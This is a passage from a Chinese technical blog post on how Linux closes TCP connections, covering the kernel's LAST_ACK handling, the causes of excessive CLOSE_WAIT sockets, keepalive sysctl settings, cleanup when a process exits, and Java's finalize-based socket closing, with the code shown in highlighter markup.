class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f96f184713636-8\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f96f184713636-9\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f96f184713636-10\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p>在接收到主动关闭端的last_ack之后，则调用tcp_done(sk)设置sk为tcp_closed状态，并回收sk的资源,如下代码所示:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f9f973531807663\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ntcp_v4_do_rcv\r\n\t|-tcp_rcv_state_process\r\nint tcp_rcv_state_process(struct sock *sk, struct sk_buff *skb, struct tcphdr *th, unsigned len)\t\r\n{\r\n\t......\r\n\t/* step 5: check the ACK field */\r\n\tif (th-&gt;ack) {\r\n\t\t...\r\n\t\tcase TCP_LAST_ACK:\r\n\t\t\t// 这处判断是确认此ack是发送Fin包对应的那个ack\r\n\t\t\tif (tp-&gt;snd_una == tp-&gt;write_seq) {\r\n\t\t\t\t\ttcp_update_metrics(sk);\r\n\t\t\t\t\t// 设置socket为closed，并回收socket的资源\r\n\t\t\t\t\ttcp_done(sk);\r\n\t\t\t\t\tgoto discard;\r\n\t\t\t}\r\n\t\t...\r\n\t}\r\n}\t\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f973531807663-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f973531807663-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f973531807663-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f973531807663-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f973531807663-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f973531807663-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f973531807663-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f973531807663-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f973531807663-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f973531807663-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f973531807663-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f973531807663-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f973531807663-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f973531807663-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f973531807663-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f973531807663-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f973531807663-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f973531807663-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f973531807663-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f973531807663-20\">20</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f9f973531807663-1\"><span class=\"crayon-v\">tcp_v4_do_rcv</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f973531807663-2\"><span class=\"crayon-h\">\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">tcp_rcv_state_process</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f973531807663-3\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">tcp_rcv_state_process</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">struct</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">sock *</span><span class=\"crayon-v\">sk</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">struct</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">sk_buff *</span><span class=\"crayon-v\">skb</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">struct</span><span class=\"crayon-h\"> </span><span class=\"crayon-e \">tcphdr *</span><span class=\"crayon-v\">th</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">unsigned</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">len</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">\t</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f973531807663-4\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f973531807663-5\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f973531807663-6\"><span class=\"crayon-h\">\t</span><span class=\"crayon-c\">/* step 5: check the ACK field */</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f973531807663-7\"><span class=\"crayon-h\">\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">th</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">ack</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f973531807663-8\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f973531807663-9\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-st\">case</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">TCP_LAST_ACK</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f973531807663-10\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-c\">// 这处判断是确认此ack是发送Fin包对应的那个ack</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f973531807663-11\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">tp</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">snd_una</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">tp</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-v\">write_seq</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f973531807663-12\"><span class=\"crayon-h\">\t\t\t\t\t</span><span class=\"crayon-e\">tcp_update_metrics</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sk</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f973531807663-13\"><span class=\"crayon-h\">\t\t\t\t\t</span><span class=\"crayon-c\">// 设置socket为closed，并回收socket的资源</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f973531807663-14\"><span class=\"crayon-h\">\t\t\t\t\t</span><span class=\"crayon-e\">tcp_done</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">sk</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f973531807663-15\"><span class=\"crayon-h\">\t\t\t\t\t</span><span class=\"crayon-st\">goto</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">discard</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f973531807663-16\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f973531807663-17\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f973531807663-18\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f973531807663-19\"><span class=\"crayon-sy\">}</span><span class=\"crayon-h\">\t</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f973531807663-20\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0026 seconds] -->\r\n<p>上述代码就是被动关闭端的后两次挥手了,如下图所示:</p>\n<p><img title=\"在这里输入图片标题\" src=\"http://jbcdn2.b0.upaiyun.com/2018/08/cf85c8b18ce1c4936f9c0bb8572c3e3e.png\" alt=\"输入图片说明\"></p>\n<h3>出现大量close_wait的情况</h3>\n<p>linux中出现大量close_wait的情况一般是应用在检测到对端fin时没有及时close当前连接。有一种可能如下图所示: <img title=\"在这里输入图片标题\" src=\"http://jbcdn2.b0.upaiyun.com/2018/08/5326eadece175d942ecb904c0b02a078.png\" alt=\"输入图片说明\"><br>\n当出现这种情况，通常是minIdle之类参数的配置不对(如果连接池有定时收缩连接功能的话)。给连接池加上心跳也可以解决这种问题。<br>\n如果应用close的时间过晚，对端已经将连接给销毁。则应用发送给fin给对端，对端会由于找不到对应的连接而发送一个RST(Reset)报文。</p>\n<h3>操作系统何时回收close_wait</h3>\n<p>如果应用迟迟没有调用close_wait,那么操作系统有没有一个回收机制呢，答案是有的。 tcp本身有一个包活(keep alive)定时器，在(keep alive)定时器超时之后，会强行将此连接关闭。可以设置tcp keep alive的时间</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f9f977192448917\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n/etc/sysctl.conf\r\nnet.ipv4.tcp_keepalive_intvl = 75\r\nnet.ipv4.tcp_keepalive_probes = 9\r\nnet.ipv4.tcp_keepalive_time = 7200  \r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f977192448917-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f977192448917-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f977192448917-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f977192448917-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f977192448917-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f9f977192448917-1\"><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sysctl</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">conf</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f977192448917-2\"><span class=\"crayon-v\">net</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">ipv4</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">tcp_keepalive_intvl</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">75</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f977192448917-3\"><span class=\"crayon-v\">net</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">ipv4</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">tcp_keepalive_probes</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f977192448917-4\"><span class=\"crayon-v\">net</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">ipv4</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">tcp_keepalive_time</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">7200</span><span class=\"crayon-h\">  </span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f977192448917-5\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p>默认值如上面所示，设置的很大，7200s后超时，如果想快速回收close_wait可以设置小一点。但最终解决方案还是得从应用程序着手。<br>\n关于tcp keepalive包活定时器可见笔者另一篇博客:<br>\n<a href=\"https://my.oschina.net/alchemystar/blog/833981\">https://my.oschina.net/alchemystar/blog/833981</a></p>\n<h2>进程关闭时清理socket资源</h2>\n<p>进程在退出时候(无论kill,kill -9 或是正常退出)都会关闭当前进程中所有的fd(文件描述符)</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f9f97a171272313\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndo_exit\r\n\t|-exit_files\r\n\t\t|-__exit_files\r\n\t\t\t|-close_files\r\n\t\t\t\t\t|-filp_close\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f97a171272313-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f97a171272313-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f97a171272313-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f97a171272313-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f97a171272313-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f97a171272313-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f9f97a171272313-1\"><span class=\"crayon-v\">do_exit</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f97a171272313-2\"><span class=\"crayon-h\">\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">exit_files</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f97a171272313-3\"><span class=\"crayon-h\">\t\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">__exit_files</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f97a171272313-4\"><span class=\"crayon-h\">\t\t\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">close_files</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f97a171272313-5\"><span class=\"crayon-h\">\t\t\t\t\t</span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">filp</span><span class=\"crayon-sy\">_</span>close</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f97a171272313-6\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0009 seconds] -->\r\n<p>这样我们又回到了博客伊始的filp_close函数，对每一个是socket的fd发送send_fin</p>\n<h2>Java GC时清理socket资源</h2>\n<p>Java的socket最终关联到AbstractPlainSocketImpl,且其重写了object的finalize方法</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670f9f97d255730927\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nabstract class AbstractPlainSocketImpl extends SocketImpl \r\n{\r\n\t......\r\n    /**\r\n     * Cleans up if the user forgets to close it.\r\n     */\r\n    protected void finalize() throws IOException {\r\n        close()\r\n    }\r\n    ......\r\n}\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f97d255730927-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f97d255730927-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f97d255730927-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f97d255730927-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f97d255730927-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f97d255730927-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f97d255730927-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f97d255730927-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f97d255730927-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f97d255730927-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab670f9f97d255730927-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670f9f97d255730927-12\">12</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670f9f97d255730927-1\"><span class=\"crayon-m\">abstract</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AbstractPlainSocketImpl</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">extends</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">SocketImpl</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f97d255730927-2\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f97d255730927-3\"><span class=\"crayon-h\">\t</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f97d255730927-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">/**</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f97d255730927-5\"><span class=\"crayon-c\">     * Cleans up if the user forgets to close it.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f97d255730927-6\"><span class=\"crayon-c\">     */</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f97d255730927-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">protected</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">finalize</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">throws</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">IOException</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f97d255730927-8\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">close</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f97d255730927-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f97d255730927-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5bab670f9f97d255730927-11\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670f9f97d255730927-12\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p>所以Java会在GC时刻会关闭没有被引用的socket,但是切记不要寄希望于Java的GC,因为GC时刻并不是以未引用的socket数量来判断的，所以有可能泄露了一堆socket,但仍旧没有触发GC。</p>\n<h2>总结</h2>\n<p>linux内核源代码博大精深，阅读其代码很费周折。之前读《TCP/IP详解卷二》的时候由于有先辈引导和梳理，所以看书中所使用的BSD源码并不觉得十分费劲。直到现在自己带着问题独立看linux源码的时候，尽管有之前的基础，仍旧被其中的各种细节所迷惑。希望笔者这篇文章能帮助到阅读linux网络协议栈代码的人。</p>\n<h2></h2>\n<div>\n<div><!-- oschina-blog-728x90 --> <ins></ins></div>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114276\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114276votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114276\" 